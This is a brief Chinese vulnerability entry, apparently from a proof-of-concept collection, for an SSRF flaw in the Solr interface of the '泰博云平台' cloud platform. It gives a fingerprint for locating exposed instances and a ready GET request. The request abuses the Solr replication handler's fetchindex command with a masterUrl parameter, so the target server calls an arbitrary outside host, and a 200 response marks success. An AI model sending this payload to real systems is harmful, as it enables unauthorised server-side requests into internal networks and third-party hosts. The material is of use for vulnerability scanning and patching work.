# 泰博云平台solr接口SSRF漏洞

泰博云平台solr接口 ｜ SSRF ｜ —
- **指纹**：`title="泰博云平台"`
- **请求**：`GET /solr/collection1/replication/?command=fetchindex&masterUrl=http://www.baidu.com HTTP/1.1`
- **响应特征**：200